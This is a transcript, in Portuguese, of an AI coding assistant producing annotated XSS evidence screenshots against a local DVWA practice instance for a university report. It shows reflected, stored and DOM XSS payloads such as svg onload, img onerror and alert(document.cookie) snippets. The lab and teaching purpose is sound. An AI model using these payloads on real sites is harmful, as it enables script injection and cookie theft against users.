+  ⎿  Kept model as Opus 4.8 (1M context)
+
+❯ /model 
+  ⎿  Kept model as Opus 4.8 (1M context)
+
+❯ /effort                                                                       
+  ⎿  Cancelled
+
+❯ analise como ficou os prints                                                  
+
+● Vou reler os 3 prints com olhar crítico + o results.json pra avaliar qualidade
+  real:
+
+  Read 1 file (ctrl+o to expand)
+
+● results.json confirma 9/9 fired: true. Mas vou reolhar as imagens com olho
+  crítico — qualidade visual, legibilidade, e principalmente o problema do
+  alertMsg (todos mostram só security=X, sem PHPSESSID):
+
+  Read 2 files (ctrl+o to expand)
+● Reolhei os 3 compostos + o JSON. Veredito honesto:
+
+  Funcionam? Sim
+
+  9/9 fired: true. Cada bloco prova execução via banner verde: payload + URL +
+  alert() capturado. DOM High via fragmento # inclusive funcionou. Como
+  evidência técnica de que o XSS executou, está sólido e auto-explicativo.
+
+  Problemas reais (3)
+
+  1. Muito espaço vazio. Screenshot é fullPage → captura a página DVWA inteira,
+  e o miolo embaixo do form é quase tudo branco. A "ação" (banner + form) ocupa
+  ~30% do topo; o resto é vazio. Composto fica longo e a prova parece pequena.
+
+  2. O cookie no banner é fraco/confuso. alert() CAPTURADO: security=low. Dois
+  pontos:
+  - O PHPSESSID não aparece (HttpOnly funcionando) — isso é bom, bate com o
+  relatório.
+  - Mas o security=low que aparece só existe porque minha automação setou esse 
+  cookie sem HttpOnly pra trocar de nível. Num teste manual no navegador, o
+  servidor seta security como HttpOnly também → document.cookie viria vazio. Ou
+  seja: o print mostra um cookie que um avaliador atento pode questionar.
+
+  3. Alert real não aparece. O popup nativo do alert() não entra no screenshot
+  (limitação conhecida, por isso o banner). Mas alguém pode querer ver a caixa
+  de diálogo de verdade.
+
+  Recomendação
+
+  Regenerar com 2 ajustes: (a) cropar pro topo da página (corta whitespace,
+  prova fica grande); (b) setar o cookie security também HttpOnly →
+  document.cookie retorna vazio, o que é a prova mais honesta e forte: "script
+  executou (banner confirma) e não vazou cookie nenhum porque tudo é HttpOnly".
+  Isso fica 100% coerente com o relatório.
+
+  Qual caminho?
+
+● User declined to answer questions
+  ⎿  · Como ajustar os prints? (Cropar + cookie HttpOnly fiel / Só cropar 
+     whitespace / Adicionar print do alert real / Deixar como está)
+
+● Você quer esclarecer algo antes de escolher. O que tá na dúvida?
+
+  Pode ser sobre:
+  - O problema do cookie (security=low no banner vs HttpOnly) — explico melhor
+  se confuso
+  - O que significa "cropar" ou capturar o alert real
+  - Se vale a pena mexer ou não
+  - Outra ideia tua pros prints
+
+  Manda.
+
+✻ Worked for 1m 7s
+
+❯ /superpowers:brainstorming                                                    
+
+● Brainstorming ativo. Contexto já mapeado (projeto Playwright, 3 prints, achado
+  HttpOnly). Você quis esclarecer antes de escolher como ajustar os prints.
+
+  O que tá na dúvida? Pra eu mirar certo, me diz qual ponto:
+
+  - O problema do cookie — por que aparece security=low no banner e o que muda
+  se eu setar HttpOnly?
+  - O que é "cropar" na prática (como fica visualmente)?
+  - Se vale a pena mexer ou os prints atuais já servem pro trabalho?
+  - Outra coisa que te incomodou nos prints?
+
+  Manda o ponto que quer destrinchar.
+
+✻ Cooked for 9s
+
+❯ quero deixar o print mais explicativo, como podemos fazer isso?]              
+
+● Pra deixar mais explicativo, primeiro preciso entender o que o print deve 
+  "contar" sozinho pro avaliador. Tem caminhos bem diferentes. Uma pergunta por
+  vez.
+
+  Hoje o print tem: banner verde (payload + URL + alert capturado) + a página
+  DVWA embaixo. O que falta é a narrativa visual. Qual recheio explicativo você
+  quer?
+
+● User answered Claude's questions:
+  ⎿  · O que o print deve explicar visualmente pro avaliador? → Sequência 
+     numerada (passos)
+
+● Boa escolha — conta a história do ataque. Agora a granularidade, que muda
+  bastante o tamanho no relatório (limite 8 págs). Os 3 passos (injeta →
+  resposta → executa) por quê?
+
+● User answered Claude's questions:
+  ⎿  · Quantos cenários ganham o tratamento de 3 passos? → 1 fluxo por tipo (3 
+     imagens)
+
+● Fechado o conceito. Aqui o desenho. Confere se bate com tua cabeça:
+
+  Desenho — 3 storyboards (1 por tipo)
+
+  Cada imagem (PRINT_1/2/3) vira um fluxo vertical de 3 passos numerados com
+  setas, usando o cenário mais ilustrativo do tipo:
+
+  Qual nível represento cada tipo (o que conta a melhor história):
+  - Reflected → High (<svg/onload>): mostra que até o filtro regex mais forte
+  falha com event handler
+  - Stored → Medium (<img onerror> no campo name): mostra o insight do campo
+  fraco + maxlength furado via POST
+  - DOM → High (fragmento #): o mais surpreendente, servidor não filtra o que
+  nunca vê
+
+  Layout de cada storyboard:
+  ┌─ REFLECTED XSS (xss_r) — nível High ──────────────┐
+  │ ① ENTRADA: payload no parâmetro GET `name`        │
+  │   [ barra de URL estilizada com o payload ]       │
+  │            ↓                                       │
+  │ ② RESPOSTA: HTML refletido pelo servidor          │
+  │   <pre>Hello <svg/onload=alert(...)></pre>        │
+  │   → regex anti-<script> não pega <svg>            │
+  │            ↓                                       │
+  │ ③ EXECUÇÃO: screenshot do alert disparado         │
+  │   alert() exibiu: security=high                   │
+  │   (PHPSESSID não aparece → HttpOnly protege)      │
+  │                                                    │
+  │ Outros níveis: Low <script> direto · Medium <img> │
+  └────────────────────────────────────────────────────┘
+
+  Variações do passo ② (a parte mais didática):
+  - Reflected: trecho do HTML refletido, payload destacado
+  - Stored: trecho do guestbook com o payload persistido (executa a cada visita)
+  - DOM: contraste — "servidor NÃO vê o fragmento; o JS lê location.href e
+  injeta via document.write" + o nó DOM gerado
+
+  Sobre o cookie no passo ③: mantenho alert(document.cookie) e a legenda explica
+  honestamente: alert disparou = XSS confirmado; valor exibido é o cookie
+  security; PHPSESSID ausente porque é HttpOnly. Amarra com o achado do
+  relatório.
+
+  Implementação: estendo o capture.js pra gravar o snippet do passo ② por
+  cenário, depois um builder monta os 3 storyboards em HTML e tira screenshot
+  (mesma técnica dos compostos atuais). Sobrescreve PRINT_1/2/3.
+
+  Bate? Ajusto algo (ex.: nível representado, ou quer os 3 níveis no lugar de 1
+  exemplo)?
+
+✻ Cooked for 2m 6s
+
+❯ pode implementar, deve ser criado novos prints                                
+
+● Aprovado. Crio prints novos (STORY_1/2/3, mantenho os PRINT_* antigos).
+  Escrevendo o builder de storyboard:
+
+● Write(xss-evidence\storyboard.js)
+  ⎿  Wrote 266 lines to xss-evidence\storyboard.js
+       2  * DVWA XSS — Storyboards explicativos (3 passos por tipo).
+       3  *
+       4  * Para o cenario representativo de cada tipo (Reflected/Stored/
+       5  * fluxo numerado: (1) entrada do payload, (2) resposta do servi
+         dor / DOM gerado,
+       6  * (3) execucao no navegador. Gera STORY_1_reflected.png, STORY_
+       7  * STORY_3_dom.png. Nao sobrescreve os PRINT_* antigos.
+       8  *
+       9  * Uso (na pasta xss-evidence, com DVWA rodando):
+      10  *   node storyboard.js
+     … +336 lines (ctrl+o to expand)
+
+● Rodando:
+
+● PowerShell(Set-Location C:\www\DVWA\xss-evidence; node storyboard.js)
+  ⎿  Error: Exit code 1
+     Alvo: http://localhost:4280
+     FALHA: page.goto: net::ERR_CONNECTION_REFUSED at 
+     http://localhost:4280/login.php
+     Call log:
+       - navigating to "http://localhost:4280/login.php", waiting until 
+     "domcontentloaded"
+
+● Conexão recusada — Docker parou. Conferindo:
+
+● PowerShell(try { $r = Invoke-WebRequest -Uri 'http://localhost:4280/login.php'
+            -UseBasicParsing -TimeoutSec 6; "DVWA UP: HTTP $($r.StatusCode)" }
+            catch { "DVWA DOWN: $($_.…)
+  ⎿  Error: Exit code 1
+     DVWA DOWN: Nenhuma conexão pôde ser feita porque a máquina de destino as 
+     recusou ativamente. (localhost:4280)
+
+● DVWA caiu. Checando containers:
+
+● PowerShell(docker ps -a --filter "ancestor=ghcr.io/digininja/dvwa:latest"
+            --format "{{.Names}} | {{.Status}}"; "---"; docker ps -a --format
+            "{{.Names}} | {{.Image}} | {{.S…)
+  ⎿  Error: Exit code 1
+     error during connect: Get "http://%2F%2F.%2Fpipe%2FdockerDesktopLinuxEngine
+     /v1.46/containers/json?all=1&filters=%7B%22ancestor%22%3A%7B%22ghcr.io%2Fdi
+     gininja%2Fdvwa%3Alatest%22%3Atrue%7D%7D": open 
+     //./pipe/dockerDesktopLinuxEngine: The system cannot find the file 
+     specified.
+     ---
+     error during connect: Get "http://%2F%2F.%2Fpipe%2FdockerDesktopLinuxEngine
+     /v1.46/containers/json?all=1": open //./pipe/dockerDesktopLinuxEngine: The 
+     system cannot find the file specified.
+
+● Diagnóstico: Docker Desktop não está rodando (pipe dockerDesktopLinuxEngine
+  não existe). Por isso o DVWA caiu.
+
+  O script tá pronto e correto — só falta o ambiente. Preciso que você suba o
+  Docker. Faz isso:
+
+  1. Abre o Docker Desktop (menu Iniciar) e espera ficar "running" (ícone verde)
+  2. Sobe o DVWA. Roda no teu terminal com o prefixo !:
+
+  ! cd C:\www\DVWA; docker compose up -d
+
+  3. Espera o banco subir (~20s) e confirma:
+
+  ! curl.exe -s -o NUL -w "%{http_code}" http://localhost:4280/login.php
+
+  Quando der 200, me avisa que eu rodo o node storyboard.js e gero os 3 prints
+  novos (STORY_1/2/3).
+
+  ▎ Obs: se o banco foi recriado do zero, o login admin/password precisa que a 
+  ▎ página Setup → Create Database tenha rodado. O script tenta logar direto; se
+  ▎ falhar por banco vazio, eu rodo node capture.js --setup antes.
+
+✻ Cooked for 3m 5s
+
+❯ ok                                                                            
+● Checando se o DVWA voltou:
+
+● PowerShell(try { $r = Invoke-WebRequest -Uri 'http://localhost:4280/login.php'
+            -UseBasicParsing -TimeoutSec 6; "DVWA UP: HTTP $($r.StatusCode)" }
+            catch { "DVWA DOWN: $($_.…)
+  ⎿  DVWA UP: HTTP 200
+
+● DVWA voltou (HTTP 200). Rodando o storyboard:
+
+● PowerShell(Set-Location C:\www\DVWA\xss-evidence; node storyboard.js)
+  ⎿  Alvo: http://localhost:4280
+     captura reflected/high: alert="security=high"
+     captura stored/medium: alert="security=medium"
+     … +8 lines (ctrl+o to expand)
+
+● 3/3 gerados. Conferindo qualidade visual dos três:
+
+  Read 1 file (ctrl+o to expand)
+
+● Bug encontrado. Steps 1 e 2 renderizaram, mas step 3 sumiu e a nota do step 2
+  cortou em "...variacoes de". Causa: a string da nota contém <script> e <svg>
+  literais não escapados — o navegador interpretou como tag real, o <script>
+  engoliu o resto da página (incluindo o step 3).
+
+  Fix: escapar as notas. Corrigindo:
+
+● Update(xss-evidence\storyboard.js)
+  ⎿  Added 1 line, removed 1 line
+      224      <div class="arrow">&#9660;</div>
+      225  
+      226      <div class="step"><div class="head"><div class="num">2</di
+           v><div class="lbl">${step.step2Label}</div></div>
+      227 -      <div class="body">${step2}<div class="note">${step.step2
+          -Note}</div></div></div>                                       
+      227 +      <div class="body">${step2}<div class="note">${esc(step.s
+          +tep2Note)}</div></div></div>                                  
+      228      <div class="arrow">&#9660;</div>
+      229  
+      230      <div class="step"><div class="head"><div class="num">3</di
+           v><div class="lbl">Execucao no navegador</div></div>
+
+● Re-rodando:
+
+● PowerShell(Set-Location C:\www\DVWA\xss-evidence; node storyboard.js)
+  ⎿  Alvo: http://localhost:4280
+     captura reflected/high: alert="security=high"
+     captura stored/medium: alert="security=medium"
+     … +8 lines (ctrl+o to expand)
+
+● Conferindo os 3 agora completos:
+
+  Read 1 file (ctrl+o to expand)
+
+● Step 3 agora aparece, história completa: URL → HTML refletido (payload
+  destacado, nota explica o bypass) → screenshot da execução + legenda HttpOnly.
+  Conferindo Stored e DOM:
+
+  Read 1 file (ctrl+o to expand)
+
+● Stored ótimo — step 3 mostra o ícone de imagem quebrada no guestbook (prova do
+  <img> injetado), step 2 mostra a persistência. Conferindo DOM (o que tem o
+  contraste servidor x cliente):
+
+  Read 1 file (ctrl+o to expand)
+
+● Os 3 storyboards completos. DOM mostra o contraste: step 2 com dois blocos
+  (servidor só vê English / DOM gerado tem o payload). Conferindo dimensões pra
+  garantir que servem no relatório:
+
+● PowerShell(Add-Type -AssemblyName System.Drawing
+            Get-ChildItem 'C:\www\DVWA\xss-evidence\output\STORY_*.png' |
+            ForEach-Object {…)
+  ⎿  STORY_1_reflected.png: 1040x991px, 104 KB
+     STORY_2_stored.png: 1040x1039px, 129 KB
+     STORY_3_dom.png: 1040x1332px, 155 KB
+
+● Pronto. Os 3 storyboards explicativos estão gerados e verificados.
+
+  Prints novos — C:\www\DVWA\xss-evidence\output\
+
+  - STORY_1_reflected.png (1040×991) — Reflected High
+  - STORY_2_stored.png (1040×1039) — Stored Medium
+  - STORY_3_dom.png (1040×1332) — DOM High
+
+  Os PRINT_1/2/3 antigos seguem intactos (não sobrescrevi).
+
+  O que cada storyboard mostra (fluxo de 3 passos)
+
+  ① Entrada — barra de URL estilizada (Reflected/DOM) ou campos do form
+  (Stored), com o payload destacado em amarelo.
+  ② Resposta — o miolo didático:
+  - Reflected: HTML refletido cru pelo servidor + nota "regex anti-<script> não
+  pega <svg onload>"
+  - Stored: o payload persistido no guestbook + nota do campo Message blindado
+  vs Name fraco
+  - DOM: contraste servidor (só vê default=English, payload ausente) × DOM
+  gerado no cliente (com o payload)
+
+  ③ Execução — screenshot real da página DVWA + legenda honesta: alert()
+  executou; document.cookie mostrou security=X; PHPSESSID ausente porque é
+  HttpOnly. No rodapé, os outros 2 níveis em 1 linha.
+
+  Sobre o relatório
+
+  Os marcadores [PRINT 1] / [PRINT 2] / [PRINT 3] no relatorio-xss-dvwa.md
+  mapeiam direto pros 3 storyboards (mesma ordem: Reflected, Stored, DOM). É só
+  inserir as imagens nesses pontos.
+
+  Pra regerar quando quiser: node xss-evidence/storyboard.js (precisa do DVWA no
+  ar).
+
+  Quer que eu já embuta as 3 imagens no docx automaticamente (substituindo os
+  marcadores [PRINT N]), pra entregar o arquivo final pronto?
+
+✻ Cogitated for 2m 15s
+
+※ recap: Goal: relatório acadêmico de XSS no DVWA pra faculdade. Os 2 docs (relatório humanizado + passo a passo) e os 3 storyboards explicativos estão prontos. Próxima ação: confirmar se quer que eu embuta as 3 imagens no docx, substituindo os marcadores [PRINT 1/2/3]. (disable recaps in /config)
